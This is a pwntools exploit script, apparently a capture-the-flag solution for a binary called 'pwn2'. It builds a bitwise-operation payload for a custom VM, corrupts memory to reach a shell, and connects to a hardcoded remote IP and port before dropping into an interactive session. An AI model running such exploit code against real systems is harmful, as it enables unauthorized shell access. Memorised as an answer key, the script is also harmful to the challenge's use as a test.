from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwn2"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
# libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("39.106.16.204", 34806)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
XOR=b"\x01"
AND=b"\x02"
OR=b"\x03"
OTHER=b"\x04"

TYPE_LIJI = b"\x01"
TYPE_REG = b"\x00"

def get(op, des, src_type, src):
    return op+des+src_type+src
appr_byte_size = 6

payload = b""
# pt_idx = 0x6c
# des_pt_idx = pt_idx
# last_char = 0x6c
payload = b""
def f8(idx=0x13,s=0xf8):
    p = b""
    offset = idx*8
    for j in range(8):
        des = p8(j+offset)
        src = p8(j+s)
        p += get(XOR, des, TYPE_REG, src)
    return p

not_b = 0x21524110  # ~0xdeadbeef (32位取反)
offset=27
payload += get(XOR, b"\x00", TYPE_LIJI, b"\x01")
for bit in range(32):
    payload += get(XOR, p8(bit+offset*8), TYPE_LIJI, p8(not_b>>bit & 1))


payload += f8()
payload += get(OR, b"\xf8", TYPE_LIJI, b"\x01") #6c-6d
payload += f8()

payload += get(AND, b"\xf0", TYPE_LIJI, b"\x00") #6d-6e
payload += get(OR, b"\xf9", TYPE_LIJI, b"\x01")
payload += f8()
    
payload += get(OR, b"\xe8", TYPE_LIJI, b"\x01") #6e-6f
payload += f8()

#6f-70
payload += get(AND, b"\xe0", TYPE_LIJI, b"\x00")  # -->6e
payload += get(AND, b"\xe9", TYPE_LIJI, b"\x00")  # -->6c
payload += get(OR, b"\xfc", TYPE_LIJI, b"\x01")   # -->7c
payload += get(AND, b"\x7a", TYPE_LIJI, b"\x00")   # -->78
payload += get(AND, b"\x9b", TYPE_LIJI, b"\x00")   # -->70
payload += f8()

#70-71
payload += get(OR, b"\xd8", TYPE_LIJI, b"\x01")   # -->71
payload += f8()


payload += get(OR, b"\xd3", TYPE_LIJI, b"\x01")   # -->79
payload += get(OR, b"\x92", TYPE_LIJI, b"\x01")   # -->7d
payload += get(OR, b"\x71", TYPE_LIJI, b"\x01")   # -->7f

offset = 0x97-0x7f
for i in range(6):
    payload += f8(idx=offset+i, s=i*8)


for i in range(32):
    payload += get(OTHER, p8(offset*8+i), TYPE_REG, p8(8*8+i))

payload += get(AND, p8(offset*8+2), TYPE_LIJI, b"\x00")
payload += get(AND, p8(offset*8+4), TYPE_LIJI, b"\x00")
payload += get(AND, p8(offset*8+6), TYPE_LIJI, b"\x00")
payload += get(OR, p8(offset*8+7), TYPE_LIJI, b"\x01")
payload += get(AND, p8(0x1c*8+0), TYPE_LIJI, b"\x00")

count = int(len(payload)/4)


io.sendlineafter("Count: ", str(count))
sleep(0.1)
debug_str = ""
# debug_str += "breakrva 0x12f6\n"
# debug_str += "breakrva 0x01528\n"      # op4
debug_str += "breakrva 0x15ce\n"     # get_shell
# debug_str += "breakrva 0x13e4\n" 
debug_str += "continue"
ddebug(debug_str)
io.sendafter("Code: ", payload)

io.interactive()

